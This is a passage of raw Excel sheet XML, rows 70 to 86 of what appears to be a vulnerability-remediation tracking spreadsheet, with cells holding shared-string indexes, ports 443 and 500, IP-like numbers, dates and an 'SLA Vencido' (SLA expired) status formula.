      </c>
      <c r="N70" s="4"/>
      <c r="O70" s="6"/>
      <c r="P70" s="10">
        <v>190216136241</v>
      </c>
      <c r="Q70" s="6"/>
      <c r="R70" s="4">
        <v>500</v>
      </c>
      <c r="S70" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T70" s="8">
        <v>43812</v>
      </c>
      <c r="U70" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V70" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W70" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X70" s="11"/>
      <c r="Y70" s="11"/>
      <c r="Z70" s="11"/>
      <c r="AA70" s="8"/>
      <c r="AB70" s="9" t="s">
        <v>290</v>
      </c>
      <c r="AC70" s="9" t="s">
        <v>306</v>
      </c>
      <c r="AD70" s="36"/>
      <c r="AE70" s="4"/>
      <c r="AF70" s="9" t="s">
        <v>261</v>
      </c>
      <c r="AG70" s="27"/>
    </row>
    <row r="71" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A71" s="5">
        <v>70</v>
      </c>
      <c r="B71" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C71" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D71" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E71" s="4"/>
      <c r="F71" s="4"/>
      <c r="G71" s="4" t="s">
        <v>263</v>
      </c>
      <c r="H71" s="4"/>
      <c r="I71" s="4"/>
      <c r="J71" s="4" t="s">
        <v>303</v>
      </c>
      <c r="K71" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L71" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M71" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N71" s="4"/>
      <c r="O71" s="6"/>
      <c r="P71" s="6" t="s">
        <v>268</v>
      </c>
      <c r="Q71" s="6"/>
      <c r="R71" s="4">
        <v>500</v>
      </c>
      <c r="S71" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T71" s="8">
        <v>43812</v>
      </c>
      <c r="U71" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V71" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W71" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X71" s="11"/>
      <c r="Y71" s="11"/>
      <c r="Z71" s="11"/>
      <c r="AA71" s="8">
        <v>43969</v>
      </c>
      <c r="AB71" s="9" t="s">
        <v>290</v>
      </c>
      <c r="AC71" s="9" t="s">
        <v>306</v>
      </c>
      <c r="AD71" s="36"/>
      <c r="AE71" s="4"/>
      <c r="AF71" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG71" s="27"/>
    </row>
    <row r="72" spans="1:33" ht="29" x14ac:dyDescent="0.35">
      <c r="A72" s="5">
        <v>71</v>
      </c>
      <c r="B72" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C72" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D72" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E72" s="4"/>
      <c r="F72" s="4"/>
      <c r="G72" s="4" t="s">
        <v>272</v>
      </c>
      <c r="H72" s="4"/>
      <c r="I72" s="4"/>
      <c r="J72" s="4" t="s">
        <v>303</v>
      </c>
      <c r="K72" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L72" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M72" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N72" s="4"/>
      <c r="O72" s="6"/>
      <c r="P72" s="6" t="s">
        <v>282</v>
      </c>
      <c r="Q72" s="6"/>
      <c r="R72" s="4">
        <v>500</v>
      </c>
      <c r="S72" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T72" s="8">
        <v>43812</v>
      </c>
      <c r="U72" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V72" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W72" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X72" s="11"/>
      <c r="Y72" s="11"/>
      <c r="Z72" s="11"/>
      <c r="AA72" s="8">
        <v>43969</v>
      </c>
      <c r="AB72" s="9"/>
      <c r="AC72" s="9" t="s">
        <v>306</v>
      </c>
      <c r="AD72" s="36"/>
      <c r="AE72" s="4"/>
      <c r="AF72" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG72" s="27"/>
    </row>
    <row r="73" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A73" s="5">
        <v>72</v>
      </c>
      <c r="B73" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C73" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D73" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E73" s="4"/>
      <c r="F73" s="4"/>
      <c r="G73" s="4" t="s">
        <v>252</v>
      </c>
      <c r="H73" s="4"/>
      <c r="I73" s="4"/>
      <c r="J73" s="4" t="s">
        <v>303</v>
      </c>
      <c r="K73" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L73" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M73" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N73" s="4"/>
      <c r="O73" s="6"/>
      <c r="P73" s="6" t="s">
        <v>253</v>
      </c>
      <c r="Q73" s="6"/>
      <c r="R73" s="4">
        <v>500</v>
      </c>
      <c r="S73" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T73" s="8">
        <v>43812</v>
      </c>
      <c r="U73" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V73" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W73" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X73" s="11"/>
      <c r="Y73" s="11"/>
      <c r="Z73" s="11"/>
      <c r="AA73" s="8"/>
      <c r="AB73" s="9" t="s">
        <v>307</v>
      </c>
      <c r="AC73" s="9" t="s">
        <v>306</v>
      </c>
      <c r="AD73" s="36"/>
      <c r="AE73" s="4"/>
      <c r="AF73" s="9" t="s">
        <v>308</v>
      </c>
      <c r="AG73" s="27"/>
    </row>
    <row r="74" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A74" s="5">
        <v>73</v>
      </c>
      <c r="B74" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C74" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D74" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E74" s="4"/>
      <c r="F74" s="4"/>
      <c r="G74" s="4" t="s">
        <v>263</v>
      </c>
      <c r="H74" s="4"/>
      <c r="I74" s="4"/>
      <c r="J74" s="4" t="s">
        <v>303</v>
      </c>
      <c r="K74" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L74" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M74" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N74" s="4"/>
      <c r="O74" s="6"/>
      <c r="P74" s="6" t="s">
        <v>264</v>
      </c>
      <c r="Q74" s="6"/>
      <c r="R74" s="4">
        <v>500</v>
      </c>
      <c r="S74" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T74" s="8">
        <v>43812</v>
      </c>
      <c r="U74" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V74" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W74" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X74" s="11"/>
      <c r="Y74" s="11"/>
      <c r="Z74" s="11"/>
      <c r="AA74" s="8">
        <v>43969</v>
      </c>
      <c r="AB74" s="9" t="s">
        <v>290</v>
      </c>
      <c r="AC74" s="9" t="s">
        <v>306</v>
      </c>
      <c r="AD74" s="36"/>
      <c r="AE74" s="4"/>
      <c r="AF74" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG74" s="27"/>
    </row>
    <row r="75" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A75" s="5">
        <v>74</v>
      </c>
      <c r="B75" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C75" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D75" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E75" s="4"/>
      <c r="F75" s="4"/>
      <c r="G75" s="4" t="s">
        <v>244</v>
      </c>
      <c r="H75" s="4"/>
      <c r="I75" s="4"/>
      <c r="J75" s="4" t="s">
        <v>309</v>
      </c>
      <c r="K75" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L75" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M75" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N75" s="4"/>
      <c r="O75" s="6"/>
      <c r="P75" s="6" t="s">
        <v>250</v>
      </c>
      <c r="Q75" s="6"/>
      <c r="R75" s="4"/>
      <c r="S75" s="22"/>
      <c r="T75" s="8">
        <v>43812</v>
      </c>
      <c r="U75" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V75" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W75" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X75" s="11"/>
      <c r="Y75" s="11"/>
      <c r="Z75" s="11"/>
      <c r="AA75" s="8">
        <v>43969</v>
      </c>
      <c r="AB75" s="9" t="s">
        <v>310</v>
      </c>
      <c r="AC75" s="9" t="s">
        <v>311</v>
      </c>
      <c r="AD75" s="36"/>
      <c r="AE75" s="4"/>
      <c r="AF75" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG75" s="27"/>
    </row>
    <row r="76" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A76" s="5">
        <v>75</v>
      </c>
      <c r="B76" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C76" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D76" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E76" s="4"/>
      <c r="F76" s="4"/>
      <c r="G76" s="4" t="s">
        <v>255</v>
      </c>
      <c r="H76" s="4"/>
      <c r="I76" s="4"/>
      <c r="J76" s="4" t="s">
        <v>309</v>
      </c>
      <c r="K76" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L76" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M76" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N76" s="4"/>
      <c r="O76" s="6"/>
      <c r="P76" s="10">
        <v>190216136241</v>
      </c>
      <c r="Q76" s="6"/>
      <c r="R76" s="4"/>
      <c r="S76" s="22"/>
      <c r="T76" s="8">
        <v>43812</v>
      </c>
      <c r="U76" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V76" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W76" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X76" s="11"/>
      <c r="Y76" s="11"/>
      <c r="Z76" s="11"/>
      <c r="AA76" s="8">
        <v>43969</v>
      </c>
      <c r="AB76" s="9" t="s">
        <v>312</v>
      </c>
      <c r="AC76" s="9" t="s">
        <v>311</v>
      </c>
      <c r="AD76" s="36"/>
      <c r="AE76" s="4"/>
      <c r="AF76" s="9" t="s">
        <v>261</v>
      </c>
      <c r="AG76" s="27"/>
    </row>
    <row r="77" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A77" s="5">
        <v>76</v>
      </c>
      <c r="B77" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C77" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D77" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E77" s="4"/>
      <c r="F77" s="4"/>
      <c r="G77" s="4" t="s">
        <v>255</v>
      </c>
      <c r="H77" s="4"/>
      <c r="I77" s="4"/>
      <c r="J77" s="4" t="s">
        <v>309</v>
      </c>
      <c r="K77" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L77" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M77" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N77" s="4"/>
      <c r="O77" s="6"/>
      <c r="P77" s="10">
        <v>190216136242</v>
      </c>
      <c r="Q77" s="6"/>
      <c r="R77" s="4"/>
      <c r="S77" s="22"/>
      <c r="T77" s="8">
        <v>43812</v>
      </c>
      <c r="U77" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V77" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W77" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X77" s="11"/>
      <c r="Y77" s="11"/>
      <c r="Z77" s="11"/>
      <c r="AA77" s="8">
        <v>43969</v>
      </c>
      <c r="AB77" s="9" t="s">
        <v>312</v>
      </c>
      <c r="AC77" s="9" t="s">
        <v>311</v>
      </c>
      <c r="AD77" s="36"/>
      <c r="AE77" s="4"/>
      <c r="AF77" s="9" t="s">
        <v>261</v>
      </c>
      <c r="AG77" s="27"/>
    </row>
    <row r="78" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A78" s="5">
        <v>77</v>
      </c>
      <c r="B78" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C78" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D78" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E78" s="4"/>
      <c r="F78" s="4"/>
      <c r="G78" s="4" t="s">
        <v>272</v>
      </c>
      <c r="H78" s="4"/>
      <c r="I78" s="4"/>
      <c r="J78" s="4" t="s">
        <v>309</v>
      </c>
      <c r="K78" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L78" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M78" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N78" s="4"/>
      <c r="O78" s="6"/>
      <c r="P78" s="6" t="s">
        <v>273</v>
      </c>
      <c r="Q78" s="6"/>
      <c r="R78" s="4"/>
      <c r="S78" s="22"/>
      <c r="T78" s="8">
        <v>43812</v>
      </c>
      <c r="U78" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V78" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W78" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X78" s="11"/>
      <c r="Y78" s="11"/>
      <c r="Z78" s="11"/>
      <c r="AA78" s="8">
        <v>43969</v>
      </c>
      <c r="AB78" s="9" t="s">
        <v>310</v>
      </c>
      <c r="AC78" s="9" t="s">
        <v>311</v>
      </c>
      <c r="AD78" s="36"/>
      <c r="AE78" s="4"/>
      <c r="AF78" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG78" s="27"/>
    </row>
    <row r="79" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A79" s="5">
        <v>78</v>
      </c>
      <c r="B79" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C79" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D79" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E79" s="4"/>
      <c r="F79" s="4"/>
      <c r="G79" s="4" t="s">
        <v>244</v>
      </c>
      <c r="H79" s="4"/>
      <c r="I79" s="4"/>
      <c r="J79" s="4" t="s">
        <v>309</v>
      </c>
      <c r="K79" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L79" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M79" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N79" s="4"/>
      <c r="O79" s="6"/>
      <c r="P79" s="6" t="s">
        <v>271</v>
      </c>
      <c r="Q79" s="6"/>
      <c r="R79" s="4"/>
      <c r="S79" s="22"/>
      <c r="T79" s="8">
        <v>43812</v>
      </c>
      <c r="U79" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V79" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W79" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X79" s="11"/>
      <c r="Y79" s="11"/>
      <c r="Z79" s="11"/>
      <c r="AA79" s="8">
        <v>43969</v>
      </c>
      <c r="AB79" s="9" t="s">
        <v>310</v>
      </c>
      <c r="AC79" s="9" t="s">
        <v>311</v>
      </c>
      <c r="AD79" s="36"/>
      <c r="AE79" s="4"/>
      <c r="AF79" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG79" s="27"/>
    </row>
    <row r="80" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A80" s="5">
        <v>79</v>
      </c>
      <c r="B80" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C80" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D80" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E80" s="4"/>
      <c r="F80" s="4"/>
      <c r="G80" s="4" t="s">
        <v>263</v>
      </c>
      <c r="H80" s="4"/>
      <c r="I80" s="4"/>
      <c r="J80" s="4" t="s">
        <v>309</v>
      </c>
      <c r="K80" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L80" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M80" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N80" s="4"/>
      <c r="O80" s="6"/>
      <c r="P80" s="6" t="s">
        <v>268</v>
      </c>
      <c r="Q80" s="6"/>
      <c r="R80" s="4"/>
      <c r="S80" s="22"/>
      <c r="T80" s="8">
        <v>43812</v>
      </c>
      <c r="U80" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V80" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W80" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X80" s="11"/>
      <c r="Y80" s="11"/>
      <c r="Z80" s="11"/>
      <c r="AA80" s="8">
        <v>43969</v>
      </c>
      <c r="AB80" s="9" t="s">
        <v>313</v>
      </c>
      <c r="AC80" s="9" t="s">
        <v>311</v>
      </c>
      <c r="AD80" s="36"/>
      <c r="AE80" s="4"/>
      <c r="AF80" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG80" s="27"/>
    </row>
    <row r="81" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A81" s="5">
        <v>80</v>
      </c>
      <c r="B81" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C81" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D81" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E81" s="4"/>
      <c r="F81" s="4"/>
      <c r="G81" s="4" t="s">
        <v>263</v>
      </c>
      <c r="H81" s="4"/>
      <c r="I81" s="4"/>
      <c r="J81" s="4" t="s">
        <v>309</v>
      </c>
      <c r="K81" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L81" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M81" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N81" s="4"/>
      <c r="O81" s="6"/>
      <c r="P81" s="6" t="s">
        <v>264</v>
      </c>
      <c r="Q81" s="6"/>
      <c r="R81" s="4"/>
      <c r="S81" s="22"/>
      <c r="T81" s="8">
        <v>43812</v>
      </c>
      <c r="U81" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V81" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W81" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X81" s="11"/>
      <c r="Y81" s="11"/>
      <c r="Z81" s="11"/>
      <c r="AA81" s="8">
        <v>43969</v>
      </c>
      <c r="AB81" s="9" t="s">
        <v>314</v>
      </c>
      <c r="AC81" s="9" t="s">
        <v>311</v>
      </c>
      <c r="AD81" s="36"/>
      <c r="AE81" s="4"/>
      <c r="AF81" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG81" s="27"/>
    </row>
    <row r="82" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A82" s="5">
        <v>81</v>
      </c>
      <c r="B82" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C82" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D82" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E82" s="4"/>
      <c r="F82" s="4"/>
      <c r="G82" s="4" t="s">
        <v>244</v>
      </c>
      <c r="H82" s="4"/>
      <c r="I82" s="4"/>
      <c r="J82" s="4" t="s">
        <v>309</v>
      </c>
      <c r="K82" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L82" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M82" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N82" s="4"/>
      <c r="O82" s="6"/>
      <c r="P82" s="6" t="s">
        <v>247</v>
      </c>
      <c r="Q82" s="6"/>
      <c r="R82" s="4"/>
      <c r="S82" s="22"/>
      <c r="T82" s="8">
        <v>43812</v>
      </c>
      <c r="U82" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V82" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W82" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X82" s="11"/>
      <c r="Y82" s="11"/>
      <c r="Z82" s="11"/>
      <c r="AA82" s="8">
        <v>43969</v>
      </c>
      <c r="AB82" s="9" t="s">
        <v>310</v>
      </c>
      <c r="AC82" s="9" t="s">
        <v>311</v>
      </c>
      <c r="AD82" s="36"/>
      <c r="AE82" s="4"/>
      <c r="AF82" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG82" s="27"/>
    </row>
    <row r="83" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A83" s="5">
        <v>82</v>
      </c>
      <c r="B83" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C83" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D83" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E83" s="4" t="s">
        <v>315</v>
      </c>
      <c r="F83" s="4"/>
      <c r="G83" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H83" s="4"/>
      <c r="I83" s="4"/>
      <c r="J83" s="4" t="s">
        <v>316</v>
      </c>
      <c r="K83" s="4" t="s">
        <v>317</v>
      </c>
      <c r="L83" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M83" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N83" s="4"/>
      <c r="O83" s="6"/>
      <c r="P83" s="4" t="s">
        <v>175</v>
      </c>
      <c r="Q83" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R83" s="4">
        <v>443</v>
      </c>
      <c r="S83" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T83" s="8">
        <v>43816</v>
      </c>
      <c r="U83" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2393</v>
      </c>
      <c r="V83" s="8">
        <f t="shared" si="4"/>
        <v>43906</v>
      </c>
      <c r="W83" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X83" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y83" s="12" t="s">
        <v>206</v>
      </c>
      <c r="Z83" s="12" t="s">
        <v>318</v>
      </c>
      <c r="AA83" s="8">
        <v>44260</v>
      </c>
      <c r="AB83" s="9" t="s">
        <v>319</v>
      </c>
      <c r="AC83" s="9" t="s">
        <v>320</v>
      </c>
      <c r="AD83" s="36"/>
      <c r="AE83" s="8">
        <v>44119</v>
      </c>
      <c r="AF83" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG83" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="84" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A84" s="5">
        <v>83</v>
      </c>
      <c r="B84" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C84" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D84" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E84" s="4" t="s">
        <v>321</v>
      </c>
      <c r="F84" s="4"/>
      <c r="G84" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H84" s="4"/>
      <c r="I84" s="4"/>
      <c r="J84" s="4" t="s">
        <v>316</v>
      </c>
      <c r="K84" s="4" t="s">
        <v>317</v>
      </c>
      <c r="L84" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M84" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N84" s="4"/>
      <c r="O84" s="6"/>
      <c r="P84" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q84" s="6" t="s">
        <v>44</v>
      </c>
      <c r="R84" s="4">
        <v>443</v>
      </c>
      <c r="S84" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T84" s="8">
        <v>43816</v>
      </c>
      <c r="U84" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2393</v>
      </c>
      <c r="V84" s="8">
        <f t="shared" si="4"/>
        <v>43906</v>
      </c>
      <c r="W84" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X84" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y84" s="30" t="s">
        <v>177</v>
      </c>
      <c r="Z84" s="30" t="s">
        <v>177</v>
      </c>
      <c r="AA84" s="8">
        <v>44025</v>
      </c>
      <c r="AB84" s="9" t="s">
        <v>322</v>
      </c>
      <c r="AC84" s="9" t="s">
        <v>323</v>
      </c>
      <c r="AD84" s="32" t="s">
        <v>324</v>
      </c>
      <c r="AE84" s="27">
        <v>44012</v>
      </c>
      <c r="AF84" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG84" s="27"/>
    </row>
    <row r="85" spans="1:33" ht="159.5" x14ac:dyDescent="0.35">
      <c r="A85" s="5">
        <v>84</v>
      </c>
      <c r="B85" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C85" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D85" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E85" s="4"/>
      <c r="F85" s="4"/>
      <c r="G85" s="4" t="s">
        <v>325</v>
      </c>
      <c r="H85" s="4"/>
      <c r="I85" s="4"/>
      <c r="J85" s="4" t="s">
        <v>326</v>
      </c>
      <c r="K85" s="4" t="s">
        <v>317</v>
      </c>
      <c r="L85" s="5" t="s">
        <v>325</v>
      </c>
      <c r="M85" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N85" s="4"/>
      <c r="O85" s="6"/>
      <c r="P85" s="10"/>
      <c r="Q85" s="6"/>
      <c r="R85" s="4"/>
      <c r="S85" s="22"/>
      <c r="T85" s="4"/>
      <c r="U85" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>46209</v>
      </c>
      <c r="V85" s="8">
        <f t="shared" si="4"/>
        <v>90</v>
      </c>
      <c r="W85" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X85" s="11"/>
      <c r="Y85" s="11"/>
      <c r="Z85" s="11"/>
      <c r="AA85" s="8" t="s">
        <v>325</v>
      </c>
      <c r="AB85" s="9" t="s">
        <v>327</v>
      </c>
      <c r="AC85" s="9" t="s">
        <v>328</v>
      </c>
      <c r="AD85" s="36"/>
      <c r="AE85" s="4"/>
      <c r="AF85" s="9" t="s">
        <v>329</v>
      </c>
      <c r="AG85" s="27"/>
    </row>
    <row r="86" spans="1:33" ht="159.5" x14ac:dyDescent="0.35">
      <c r="A86" s="5">
        <v>85</v>
      </c>
      <c r="B86" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C86" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D86" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E86" s="4"/>
      <c r="F86" s="4"/>
      <c r="G86" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H86" s="4"/>
      <c r="I86" s="4"/>
      <c r="J86" s="4" t="s">
        <v>330</v>
      </c>
      <c r="K86" s="4" t="s">
        <v>331</v>
      </c>
      <c r="L86" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M86" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N86" s="4"/>
      <c r="O86" s="6"/>
      <c r="P86" s="10">
        <v>94188208248</v>
      </c>
      <c r="Q86" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R86" s="4">
        <v>443</v>
      </c>
      <c r="S86" s="22"/>
      <c r="T86" s="8">
        <v>43816</v>
      </c>
      <c r="U86" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2393</v>
      </c>
      <c r="V86" s="8">
        <f t="shared" si="4"/>
        <v>43906</v>
      </c>
      <c r="W86" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X86" s="11"/>
      <c r="Y86" s="11"/>
      <c r="Z86" s="11"/>
      <c r="AA86" s="8">
        <v>44069</v>
      </c>
      <c r="AB86" s="9" t="s">
        <v>332</v>
      </c>
      <c r="AC86" s="9" t="s">
        <v>333</v>
      </c>
      <c r="AD86" s="36"/>
      <c r="AE86" s="4"/>
      <c r="AF86" s="4" t="s">
        <v>148</v>
      </c>
      <c r="AG86" s="27" t="s">
        <v>149</v>
      </c>
    </row>
